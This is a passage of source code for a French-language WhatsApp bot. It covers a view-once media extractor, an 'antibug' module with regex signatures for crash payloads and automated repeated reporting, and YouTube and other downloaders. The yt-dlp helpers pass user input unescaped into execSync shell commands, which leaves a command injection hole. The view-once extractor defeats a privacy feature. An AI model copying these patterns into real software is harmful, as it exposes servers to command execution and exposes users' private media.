    const qImg = qVO?.message?.imageMessage || quoted?.imageMessage;
    const qVid = qVO?.message?.videoMessage || quoted?.videoMessage;
    const qAud = qVO?.message?.audioMessage || quoted?.audioMessage || qVO?.message?.pttMessage || quoted?.pttMessage;

    if (qImg) {
      mediaType = 'image'; mimetype = qImg.mimetype || 'image/jpeg';
      mediaData = await toBuffer(await downloadContentFromMessage(qImg, 'image'));
    } else if (qVid) {
      mediaType = 'video'; mimetype = qVid.mimetype || 'video/mp4';
      isGif = qVid.gifPlayback || false;
      mediaData = await toBuffer(await downloadContentFromMessage(qVid, 'video'));
    } else if (qAud) {
      mediaType = 'audio'; mimetype = qAud.mimetype || 'audio/ogg; codecs=opus';
      isPtt = qAud.ptt !== false;
      mediaData = await toBuffer(await downloadContentFromMessage(qAud, 'audio'));
    }

    // 2. Si pas trouvé dans quoted, chercher dans le cache temporaire par messageId
    if ((!mediaData || mediaData.length < 100) && quotedId) {
      global._vvTempCache = global._vvTempCache || new Map();
      const cached = global._vvTempCache.get(quotedId);
      if (cached) {
        mediaData = cached.buffer; mediaType = cached.type;
        mimetype = cached.mimetype; isGif = cached.isGif; isPtt = cached.ptt;
      }
    }

    if (!mediaData || mediaData.length < 100) {
      await sock.sendMessage(remoteJid, {
        text: `❌ Média introuvable. Le vu-unique a peut-être expiré.\n\n*© SEIGNEUR TD*`
      }, { quoted: message });
      return;
    }

    // Envoyer dans le chat (toPv = false)
    await sendVVMedia(sock, remoteJid, {
      type: mediaType, buffer: mediaData, mimetype, isGif, ptt: isPtt,
      timestamp: Date.now(), sender: senderJid, size: mediaData.length, fromJid: senderJid
    }, 1, 1, false);

  } catch(e) {
    console.error('[VV command]', e.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ Erreur lors de l'extraction du média.\n\n*© SEIGNEUR TD*`
    }, { quoted: message });
  }
}

// Envoyer un média VV with infos
async function sendVVMedia(sock, remoteJid, item, num, total, toPv = false) {
  try {
    const date = new Date(item.timestamp).toLocaleString('ar-SA', {
      timeZone: 'America/Port-au-Prince',
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    const from = item.fromJid.split('@')[0];
    const caption = '';
    // Si toPv=true, envoyer en PV du bot
    const _dest = toPv ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : remoteJid;

    if (item.type === 'image') {
      await sock.sendMessage(_dest, {
        image: item.buffer,
        caption
      });
    } else if (item.type === 'video') {
      await sock.sendMessage(_dest, {
        video: item.buffer,
        caption,
        gifPlayback: item.isGif || false
      });
    } else if (item.type === 'audio') {
      await sock.sendMessage(_dest, {
        audio: item.buffer,
        ptt: false,
        mimetype: 'audio/ogg; codecs=opus',
        audioPlayback: true
      });
    }
  } catch (e) {
    console.error('[sendVVMedia]', e.message);
    // Silencieux — ne pas envoyer de message d'erreur dans le chat
  }
}

// =============================================
// =============================================

// Signatures de payloads malveillants connus
const BUG_SIGNATURES = {
  // Caractères arabes crashants (U+0600–U+0605, U+202E RTL, etc.)
  arabicCrash: /[\u0600-\u0605\u200E\u200F\u202A-\u202E\u2066-\u2069]{10,}/,
  // Flood d'emojis (>200 emojis consécutifs)
  emojiFlood: /(\p{Emoji_Presentation}|\p{Extended_Pictographic}){50,}/u,
  // Caractères invisibles en masse (zero-width)
  invisibleChars: /[\u200B-\u200D\uFEFF\u180E\u034F]{20,}/,
  // Zalgo / caractères combinants excessifs
  zalgo: /[\u0300-\u036F\u0489\u1DC0-\u1DFF]{15,}/,
  // Chaînes extrêmement longues (>5000 chars d'un seul message)
  massiveText: null, // géré par longueur
  // Caractères CJK en masse (chinois crashant)
  cjkFlood: /[\u4E00-\u9FFF\u3400-\u4DBF]{200,}/,
  // RTL override massif
  rtlOverride: /\u202E{3,}/,
  // Null bytes / caractères de contrôle
  controlChars: /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{5,}/,
};

// Détection dans le contenu du message (texte + métadonnées)
function detectBugPayload(message, messageText) {
  try {
    // 1. Analyser le texte principal
    const text = messageText || '';

    // Longueur excessive
    if (text.length > 5000) {
      return { type: 'MASSIVE_TEXT', detail: `${text.length} caractères`, severity: 'HIGH' };
    }

    // Vérifier chaque signature
    for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
      if (regex && regex.test(text)) {
        return { type: name.toUpperCase(), detail: 'Payload malveillant détecté', severity: 'HIGH' };
      }
    }

    // 2. Analyser les métadonnées du message (contextInfo malveillant)
    const ctx = message.message?.extendedTextMessage?.contextInfo;
    if (ctx) {
      // Thumbnail URL corrompue
      const extAd = ctx.externalAdReply;
      if (extAd) {
        const title = extAd.title || '';
        const body = extAd.body || '';
        if (title.length > 2000 || body.length > 2000) {
          return { type: 'MALICIOUS_CONTEXT', detail: 'externalAdReply corrompu', severity: 'HIGH' };
        }
        // Vérifier les payloads dans le titre/body
        for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
          if (regex && (regex.test(title) || regex.test(body))) {
            return { type: `CONTEXT_${name.toUpperCase()}`, detail: 'Payload dans contextInfo', severity: 'HIGH' };
          }
        }
      }
    }

    // 3. Détecter les messages viewOnce with contenu malveillant
    const vv = message.message?.viewOnceMessageV2 || message.message?.viewOnceMessageV2Extension;
    if (vv) {
      const innerCtx = vv.message?.extendedTextMessage?.contextInfo?.externalAdReply;
      if (innerCtx?.title?.length > 1000) {
        return { type: 'VIEWONCE_EXPLOIT', detail: 'ViewOnce with payload', severity: 'CRITICAL' };
      }
    }

    // 4. Détecter les stickers malveillants (payload dans webpUrl)
    const sticker = message.message?.stickerMessage;
    if (sticker?.url && sticker.url.length > 500) {
      return { type: 'STICKER_EXPLOIT', detail: 'Sticker with URL suspecte', severity: 'MEDIUM' };
    }

    // 5. Flood de mentions (>20 mentions = attaque)
    const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentions.length > 20) {
      return { type: 'MENTION_FLOOD', detail: `${mentions.length} mentions`, severity: 'HIGH' };
    }

  } catch (e) {
    console.error(' detectBugPayload:', e);
    return null;
  }
}

async function handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugInfo) {
  const senderNum = senderJid.split('@')[0];
  const now = Date.now();


  // 1. Supprimer immédiatement le message malveillant
  try {
    await sock.sendMessage(remoteJid, { delete: message.key });
  } catch (e) { /* peut échouer si pas admin groupe */ }

  // 2. Mettre à jour le tracker
  const existing = antiBugTracker.get(senderJid) || { count: 0, firstSeen: now, lastSeen: now, blocked: false, attacks: [] };
  existing.count++;
  existing.lastSeen = now;
  existing.attacks.push({ type: bugInfo.type, detail: bugInfo.detail, severity: bugInfo.severity, timestamp: now });
  antiBugTracker.set(senderJid, existing);

  // 3. Si déjà bloqué, ignorer silencieusement
  if (existing.blocked) {
    return;
  }

  // 4. Alerte dans le chat
  const severityEmoji = bugInfo.severity === 'CRITICAL' ? '☠️' : bugInfo.severity === 'HIGH' ? '🔴' : '🟡';

  await sock.sendMessage(remoteJid, {
    text: `⚠️ *ATTENTION !*

🚨 UN LONG TEXTE SUSPECT A ÉTÉ DÉTECTÉ !

📱 Envoyé par : @${senderNum}

*© SEIGNEUR TD*`,
    mentions: [senderJid]
  });

  // 5. Si 5 attaques ou CRITICAL → action immédiate
  if (existing.count >= 5 || bugInfo.severity === 'CRITICAL') {
    existing.blocked = true;
    antiBugTracker.set(senderJid, existing);

    // a. Signaler 5 fois à WhatsApp
    await reportToWhatsApp(sock, senderJid, senderNum, existing.attacks);

    // b. Bloquer le contact
    try {
      await sock.updateBlockStatus(senderJid, 'block');
    } catch (e) {
      console.error(' blocage:', e);
    }

    // c. Si groupe → expulser
    if (isGroup) {
      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
        }
      } catch (e) { /* silencieux */ }
    }

    // d. Message de confirmation
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅     ✅  ━━━┓

☠️ *   :*

📱 : +${senderNum}
🔒 :  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅     (5 )
✅   
${isGroup ? '✅    ' : ''}
✅     

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 * :*
${existing.attacks.slice(-3).map((a, i) => `${i + 1}. ${a.type} - ${a.severity}`).join('\n')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*    -  *`,
      mentions: [senderJid]
    });

    // e. Notifier l'admin du bot en privé
    for (const adminJid of config.adminNumbers) {
      try {
        await sock.sendMessage(adminJid, {
          text: `🚨 *  *\n\n☠️  ${bugInfo.severity}  !\n\n📱 : +${senderNum}\n📍 : ${isGroup ? '' : ' '}\n🔍 : ${bugInfo.type}\n🔢 : ${existing.count}\n\n✅ :  +   + ${isGroup ? ' + ' : ''}`
        });
      } catch (e) { /* silencieux */ }
    }
  }
}

// Envoyer des signalements à WhatsApp (5 fois)
async function reportToWhatsApp(sock, senderJid, senderNum, attacks) {

  const reportReasons = [
    'spam',          // Spam
    'inappropriate', // Contenu inapproprié
    'harassment',    // Harcèlement
    'threat',        // Menace
    'other'          // Autre
  ];

  for (let i = 0; i < 5; i++) {
    try {
      // Signalement via l'API Baileys
      await sock.reportJid(senderJid, 'spam');
      await delay(800); // Délai entre chaque signalement
    } catch (e) {
      // Si reportJid n'existe pas, utiliser sendMessage vers le support WhatsApp
      try {
        await sock.sendMessage('0@s.whatsapp.net', {
        });
      } catch (e2) {
      }
      await delay(500);
    }
  }

}

// Commande !antibug (toggle + status + liste)
async function handleAntiBugCommand(sock, args, remoteJid, senderJid) {
  const sub = args[0]?.toLowerCase();

  // !antibug list → liste des attaquants détectés
  if (sub === 'list') {
    if (antiBugTracker.size === 0) {
      await sock.sendMessage(remoteJid, {
        text: `🛡️ *  *\n\n✅    `
      });
      return;
    }

    let listText = `┏━━━  🛡️    🛡️  ━━━┓\n\n`;
    let i = 1;
    for (const [jid, data] of antiBugTracker.entries()) {
      const num = jid.split('@')[0];
      const date = new Date(data.lastSeen).toLocaleString('ar-SA', { timeZone: 'America/Port-au-Prince' });
      const status = data.blocked ? '🔒 ' : `⚠️ ${data.count} `;
      listText += `${i}. +${num}\n   ${status} | ${data.attacks[0]?.type || '?'}\n   📅 ${date}\n\n`;
      i++;
    }
    listText += `┗━━━━━━━━━━━━━━━━━━━━━━┛\n`;
    listText += `📊 : ${antiBugTracker.size} ()`;

    await sock.sendMessage(remoteJid, { text: listText });
    return;
  }

  // !antibug clear → vider le tracker
  if (sub === 'clear') {
    const count = antiBugTracker.size;
    antiBugTracker.clear();
    await sock.sendMessage(remoteJid, {
      text: `🗑️     (${count} )`
    });
    return;
  }

  // !antibug unblock <number> → débloquer manuellement
  if (sub === 'unblock' && args[1]) {
    const num = args[1].replace(/[^0-9]/g, '');
    const jid = num + '@s.whatsapp.net';
    try {
      await sock.updateBlockStatus(jid, 'unblock');
      antiBugTracker.delete(jid);
      await sock.sendMessage(remoteJid, {
        text: `✅     +${num}`
      });
    } catch (e) {
      await sock.sendMessage(remoteJid, {
        text: `❌    : ${e.message}`
      });
    }
    return;
  }

  // !antibug (sans argument) → toggle ON/OFF
  antiBug = !antiBug;
  saveStoreKey('config');

  const statusEmoji = antiBug ? '✅' : '❌';
  const statusText  = antiBug ? '' : '';

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🛡️    🛡️  ━━━┓

${statusEmoji} *: ${statusText}*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 *  :*

☠️    (Crash)
🐛    (>50)
👻    (>20)
🌀  Zalgo ()
📏   (>5000 )
🀄    (>200)
↪️ RTL Override 
📌 Mentions  (>20)
🖼️ ContextInfo 
👁️ ViewOnce  Payload
🎯 Sticker URL 

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *  :*

1️⃣   
2️⃣   
3️⃣  5 :
   • 📨 5  
   • 🔒  
   • 🚫   
   • 📲  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 * :*

• !antibug list     →  
• !antibug clear    →  
• !antibug unblock [] →  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️  : ${antiBugTracker.size}
🔒 : ${[...antiBugTracker.values()].filter(v => v.blocked).length}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`
  });
}

// =============================================
// 📥 FONCTIONS DE DOWNLOAD
// =============================================
// Dépendances requises (à installer sur votre serveur):
//   npm install @distube/ytdl-core play-dl node-fetch
// =============================================

// Importer dynamiquement pour éviter crash si non installé
async function getYtdl() {
  try { return (await import('@distube/ytdl-core')).default; }
  catch { return null; }
}
async function getPlayDl() {
  try { return await import('play-dl'); }
  catch { return null; }
}
async function getFetch() {
  try { return (await import('node-fetch')).default; }
  catch {
    try { return (await import('axios')).default; }
    catch { return null; }
  }
}

// ─── Extraire videoId depuis URL YouTube ─────────────────────────────────────
function extractYouTubeId(url) {
  const m = url.match(/(?:youtu\.be\/|v=|embed\/)([\w-]{11})/);
  return m ? m[1] : null;
}

// ─── Recherche YouTube via yt-dlp ─────────────────────────────────────────────
async function searchYouTubeId(query) {
  // Si c'est déjà un lien YouTube, extraire l'ID directement
  if (query.includes('youtu.be') || query.includes('youtube.com')) {
    const id = extractYouTubeId(query);
    if (id) return id;
  }
  // Recherche via yt-dlp
  try {
    const { execSync } = await import('child_process');
    const result = execSync(
      'yt-dlp "ytsearch1:' + query.replace(/"/g, '') + '" --print id --no-playlist --quiet',
      { timeout: 15000, encoding: 'utf8' }
    ).trim();
    if (result && result.length === 11) return result;
  } catch(e) { console.log('[YT SEARCH yt-dlp]', e.message); }
  // Fallback scraping YouTube
  try {
    const r = await axios.get('https://www.youtube.com/results?search_query=' + encodeURIComponent(query), {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }, timeout: 10000
    });
    const m = r.data.match(/"videoId":"([\w-]{11})"/);
    if (m) return m[1];
  } catch(e) {}
  return null;
}

// ─── Téléchargement audio via yt-dlp ─────────────────────────────────────────
async function downloadYouTubeAudioBuffer(videoUrl) {
  const { execSync, spawnSync } = await import('child_process');
  const os = await import('os');
  const pathLib = await import('path');
  const tmpFile = pathLib.join(os.tmpdir(), 'ytaudio_' + Date.now());

  // ✅ Méthode 1 : yt-dlp (le plus fiable, installé sur le serveur)
  try {
    spawnSync('yt-dlp', [
      videoUrl,
      '-x', '--audio-format', 'mp3',
      '--audio-quality', '128K',
      '-o', tmpFile + '.%(ext)s',
      '--no-playlist',
      '--quiet',
      '--no-warnings',
      '--socket-timeout', '30'
    ], { timeout: 120000 });
    const outFile = tmpFile + '.mp3';
    if (fs.existsSync(outFile)) {
      const buf = fs.readFileSync(outFile);
      fs.unlinkSync(outFile);
      if (buf.length > 10000) {
        // Récupérer le titre
        let title = '';
        try {
          title = execSync('yt-dlp "' + videoUrl + '" --print title --no-playlist --quiet', { timeout: 10000, encoding: 'utf8' }).trim();
        } catch(e) {}
        return { buf, title };
      }
    }
  } catch(e) { console.log('[YT-DLP AUDIO]', e.message); }

  // ✅ Méthode 2 : APIs externes en fallback
  const apis = [
    async () => {
      const { data } = await axios.get('https://api.giftedtech.co.ke/api/download/savetubemp3?apikey=gifted&url=' + encodeURIComponent(videoUrl), { timeout: 30000 });
      if (!data?.success || !data?.result?.download_url) throw new Error('indisponible');
      const dl = await axios.get(data.result.download_url, { responseType: 'arraybuffer', timeout: 120000 });
      return { buf: Buffer.from(dl.data), title: data?.result?.title };
    },
    async () => {
      const { data } = await axios.post('https://api.cobalt.tools/api/json',
        { url: videoUrl, isAudioOnly: true, aFormat: 'mp3' },
        { headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, timeout: 20000 }
      );
      if (!data?.url) throw new Error('no url');
      const dl = await axios.get(data.url, { responseType: 'arraybuffer', timeout: 120000 });
      return { buf: Buffer.from(dl.data), title: null };
    }
  ];
  for (const api of apis) {
    try {
      const result = await api();
      if (result?.buf?.length > 10000) return result;
    } catch(e) { console.log('[YT AUDIO API]', e.message); }
  }
  throw new Error('Téléchargement impossible. Installe yt-dlp sur le serveur: pip install yt-dlp');
}

// ─── Téléchargement vidéo via yt-dlp ─────────────────────────────────────────
async function downloadYouTubeVideoBuffer(videoUrl) {
  const { spawnSync, execSync } = await import('child_process');
  const os = await import('os');
  const pathLib = await import('path');
  const tmpFile = pathLib.join(os.tmpdir(), 'ytvideo_' + Date.now());

  // ✅ yt-dlp
  try {
    spawnSync('yt-dlp', [
      videoUrl,
      '-f', 'bestvideo[ext=mp4][height<=720]+bestaudio[ext=m4a]/best[ext=mp4][height<=720]/best[height<=720]',
      '--merge-output-format', 'mp4',
      '-o', tmpFile + '.%(ext)s',
      '--no-playlist',
      '--quiet',
      '--no-warnings',
      '--socket-timeout', '30'
    ], { timeout: 180000 });
    const outFile = tmpFile + '.mp4';
    if (fs.existsSync(outFile)) {
      const buf = fs.readFileSync(outFile);
      fs.unlinkSync(outFile);
      if (buf.length > 10000) {
        let title = '';
        try { title = execSync('yt-dlp "' + videoUrl + '" --print title --no-playlist --quiet', { timeout: 10000, encoding: 'utf8' }).trim(); } catch(e) {}
        return { buf, title };
      }
    }
  } catch(e) { console.log('[YT-DLP VIDEO]', e.message); }

  // Fallback APIs
  try {
    const { data } = await axios.post('https://api.cobalt.tools/api/json',
      { url: videoUrl, vCodec: 'h264', vQuality: '720', isAudioOnly: false },
      { headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, timeout: 20000 }
    );
    const dlUrl = data?.url || data?.picker?.[0]?.url;
    if (dlUrl) {
      const dl = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      return { buf: Buffer.from(dl.data), title: null };
    }
  } catch(e) { console.log('[YT VIDEO cobalt]', e.message); }

  throw new Error('Téléchargement impossible. Installe yt-dlp: pip install yt-dlp');
}

// ─── YOUTUBE AUDIO (MP3) ─────────────────────────────────────────────────────
async function handleYouTubeAudio(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎵 Usage: ${config.prefix}ytmp3 <titre ou lien YouTube>` }, { quoted: message });
  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement audio en cours...*' }, { quoted: message });
  try {
    let videoUrl = query;
    if (!query.includes('youtube.com') && !query.includes('youtu.be')) {
      const vid = await searchYouTubeId(query);
      if (!vid) throw new Error('Vidéo introuvable');
      videoUrl = `https://www.youtube.com/watch?v=${vid}`;
    }
    const { buf, title } = await downloadYouTubeAudioBuffer(videoUrl);
    await sock.sendMessage(remoteJid, { audio: buf, mimetype: 'audio/mpeg', fileName: `${title || query}.mp3` }, { quoted: message });
    await sock.sendMessage(remoteJid, { text: `✅ *${title || query}*\n📏 ${(buf.length/1024/1024).toFixed(2)} MB\n© SEIGNEUR TD`, edit: loadMsg.key });
  } catch(e) {
    console.error('[YT AUDIO]', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur lors du téléchargement audio.\n💡 ${e.message}`, edit: loadMsg.key });
  }
}

// ─── YouTube Vidéo ──────────────────────────────────────────────────────────
async function handleYouTubeVideo(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎬 Usage: ${config.prefix}playvideo <titre ou lien YouTube>` }, { quoted: message });
  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement vidéo en cours...*' }, { quoted: message });
  try {
    let videoUrl = query;
    if (!query.includes('youtube.com') && !query.includes('youtu.be')) {
      const vid = await searchYouTubeId(query);
      if (!vid) throw new Error('Vidéo introuvable');
      videoUrl = `https://www.youtube.com/watch?v=${vid}`;
    }
    const { buf, title } = await downloadYouTubeVideoBuffer(videoUrl);
    await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: `✅ *${title || query}*\n📏 ${(buf.length/1024/1024).toFixed(1)} MB\n© SEIGNEUR TD ` }, { quoted: message });
    await sock.sendMessage(remoteJid, { text: '✅ Vidéo envoyée !', edit: loadMsg.key });
  } catch(e) {
    console.error('[YT VIDEO]', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur lors du téléchargement vidéo.\n💡 ${e.message}`, edit: loadMsg.key });
  }
}

// ─── ytSearch compat ────────────────────────────────────────────────────────
async function ytSearch(query) {
  try {
    const vid = await searchYouTubeId(query);
    if (!vid) return { status: false };
    return { status: true, result: { searched_title: query, searched_url: `https://youtu.be/${vid}`, videoId: vid } };
  } catch { return { status: false }; }
}

// ─── Play Menu ──────────────────────────────────────────────────────────────
async function handlePlayMenu(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎵 Usage: ${config.prefix}play <titre YouTube>` }, { quoted: message });
  const searchQuery = args.join(' ');
  try { await sock.sendMessage(remoteJid, { react: { text: '✨', key: message.key } }); } catch(e) {}
  const loadMsg = await sock.sendMessage(remoteJid, { text: '🔍 *Recherche en cours...*' }, { quoted: message });
  try {
    const r = await axios.get('https://api-faa.my.id/faa/ytplayvid', { params: { q: searchQuery }, timeout: 10000 });
    const res = r.data?.result;
    if (!res) throw new Error('Vidéo introuvable');
    const p = config.prefix;
    await sock.sendMessage(remoteJid, { text: `🎶 *YouTube Player*\n\n📌 *${res.title || searchQuery}*\n🔗 https://youtu.be/${res.videoId}`, edit: loadMsg.key });

  } catch(e) {
    console.error('[PLAY MENU]', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
  }
}

// ─── Play Audio (alias) ─────────────────────────────────────────────────────
async function handlePlayAudio(sock, args, remoteJid, senderJid, message) {
  return handleYouTubeAudio(sock, args, remoteJid, senderJid, message);
}

// ─── Play Video (alias) ─────────────────────────────────────────────────────
async function handlePlayVideo(sock, args, remoteJid, senderJid, message) {
  return handleYouTubeVideo(sock, args, remoteJid, senderJid, message);
}

// ─── Play PTT ───────────────────────────────────────────────────────────────
async function handlePlayPTT(sock, args, remoteJid, senderJid, message) {
  if (!args.length) return sock.sendMessage(remoteJid, { text: `🎤 Usage: ${config.prefix}playptt <titre>` }, { quoted: message });
  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Téléchargement PTT en cours...*' }, { quoted: message });
  try {
    const r = await axios.get('https://api-faa.my.id/faa/ytplayvid', { params: { q: query }, timeout: 10000 });
    const vid = r.data?.result?.videoId;
    if (!vid) throw new Error('Vidéo introuvable');
    const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/savetubemp3?apikey=gifted&url=${encodeURIComponent(`https://www.youtube.com/watch?v=${vid}`)}`, { timeout: 30000 });
    if (!data?.success || !data?.result?.download_url) throw new Error('API indisponible');
    const dlRes = await axios.get(data.result.download_url, { responseType: 'arraybuffer', timeout: 90000 });
    await sock.sendMessage(remoteJid, { audio: Buffer.from(dlRes.data), mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: message });
    await sock.sendMessage(remoteJid, { text: '✅ PTT envoyé !', edit: loadMsg.key });
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}`, edit: loadMsg.key });
  }
}

// ─── TikTok ─────────────────────────────────────────────────────────────────
// ─── GIFTED DOWNLOAD — Toutes les commandes download via api.giftedtech.co.ke ──
async function handleXwolfDownload(sock, command, args, remoteJid, message) {
  const GIFTED = 'https://api.giftedtech.co.ke/api/download';
  const query = args.join(' ').trim();
  const url   = args[0]?.trim() || '';

  try { await sock.sendMessage(remoteJid, { react: { text: '⏳', key: message.key } }); } catch(e) {}
  const loadMsg = await sock.sendMessage(remoteJid, { text: '⏳ *Traitement en cours...*' }, { quoted: message });
  const editLoad = async (txt) => { try { await sock.sendMessage(remoteJid, { text: txt, edit: loadMsg.key }); } catch(e) {} };

  try {

    // ── APK ───────────────────────────────────────────────────────────────────
    if (command === 'apk') {
      if (!query) return editLoad(`❗ Usage: ${config.prefix}apk <nom application>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/apkdl`, { params: { apikey: 'gifted', appName: query }, timeout: 60000 });
      const result = data?.result?.[0] || data?.results?.[0] || data?.result || data;
      const dlUrl = result?.download || result?.dllink || result?.apk_link || result?.link;
      const title = result?.name || result?.app || query;
      const size  = result?.size || result?.filesize || '';
      const version = result?.version || '';
      if (!dlUrl) {
        const infoText = `🔍 *APK trouvé:* ${title}${version ? '\n📦 Version: ' + version : ''}${size ? '\n📏 Taille: ' + size : ''}\n\n*© SEIGNEUR TD*`;
        return editLoad(infoText);
      }
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        document: buf, mimetype: 'application/vnd.android.package-archive',
        fileName: `${title}.apk`, caption: `✅ *${title}*${version ? '\n📦 ' + version : ''}
📏 ${size || (buf.length/1024/1024).toFixed(1) + ' MB'}

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ APK envoyé !');

    // ── FB ────────────────────────────────────────────────────────────────────
    } else if (command === 'fb') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}fb <url Facebook>`);

      const fbPatterns = [
        /https?:\/\/(?:www\.)?facebook\.com\//,
        /https?:\/\/fb\.watch\//,
        /https?:\/\/m\.facebook\.com\//,
        /https?:\/\/web\.facebook\.com\//,
        /https?:\/\/(?:www\.)?facebook\.com\/share\//
      ];
      if (!fbPatterns.some(p => p.test(url))) {
        return editLoad('❌ Lien Facebook invalide. Fournis un lien vidéo Facebook valide.');
      }

      await editLoad('⏳ Téléchargement en cours...');

      // Essai 1 : API principale
      let dlUrl = null, title = 'Facebook';
      try {
        const { data } = await axios.get(
          `https://apiskeith.top/download/fbdown?url=${encodeURIComponent(url)}`,
          { timeout: 60000 }
        );
        if (data?.status && data?.result?.media) {
          dlUrl = data.result.media.hd || data.result.media.sd;
          title = data.result.title || title;
        }
      } catch(e1) {}

      // Essai 2 : API de secours
      if (!dlUrl) {
        try {
          const { data } = await axios.get(
            `https://api.giftedtech.co.ke/api/download/facebookv2`,
            { params: { apikey: 'gifted', url }, timeout: 60000 }
          );
          const r = data?.result || data;
          dlUrl = r?.hd || r?.sd || r?.download_url || r?.url || r?.video;
          title = r?.title || title;
        } catch(e2) {}
      }

      if (!dlUrl) throw new Error('Vidéo introuvable — vérifie que le lien est public');

      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        video: buf, mimetype: 'video/mp4',
        caption: `✅ *${title}*\n📏 ${(buf.length/1024/1024).toFixed(1)} MB\n\n*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ Facebook envoyé !');

    // ── YTMP4 ─────────────────────────────────────────────────────────────────
    } else if (command === 'ytmp4') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}ytmp4 <url YouTube>`);
      const { data } = await axios.get(`${GIFTED}/ytmp4`, { params: { apikey: 'gifted', url, quality: '720p' }, timeout: 120000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const title = data?.result?.title || data?.title || 'vidéo';
      if (!dlUrl) throw new Error('Vidéo introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 240000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        video: buf, mimetype: 'video/mp4',
        caption: `✅ *${title}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ YouTube MP4 envoyé !');

    // ── YTMP3 ─────────────────────────────────────────────────────────────────
    } else if (command === 'ytmp3' || command === 'ytaudio') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}ytmp3 <url YouTube>`);
      const { data } = await axios.get(`${GIFTED}/ytmp3`, { params: { apikey: 'gifted', url, quality: '128kbps' }, timeout: 120000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const title = data?.result?.title || data?.title || 'audio';
      if (!dlUrl) throw new Error('Audio introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        audio: buf, mimetype: 'audio/mpeg', fileName: `${title}.mp3`
      }, { quoted: message });
      await editLoad(`✅ *${title}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB`);

    // ── TIKTOK ────────────────────────────────────────────────────────────────
    } else if (command === 'tiktok' || command === 'tiktokmp3') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}${command} <url TikTok>`);
      const { data } = await axios.get(`${GIFTED}/tiktokdlv2`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const r = data?.result || data;
      if (command === 'tiktokmp3') {
        const audioUrl = r?.music || r?.audio;
        if (!audioUrl) throw new Error('Audio TikTok introuvable');
        const res = await axios.get(audioUrl, { responseType: 'arraybuffer', timeout: 120000 });
        const buf = Buffer.from(res.data);
        await sock.sendMessage(remoteJid, { audio: buf, mimetype: 'audio/mpeg', fileName: 'tiktok.mp3' }, { quoted: message });
        await editLoad('✅ TikTok Audio envoyé !');
      } else {
        const dlUrl = r?.video_nowm || r?.video || r?.play;
        if (!dlUrl) throw new Error('Vidéo TikTok introuvable');
        const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
        const buf = Buffer.from(res.data);
        await sock.sendMessage(remoteJid, {
          video: buf, mimetype: 'video/mp4',
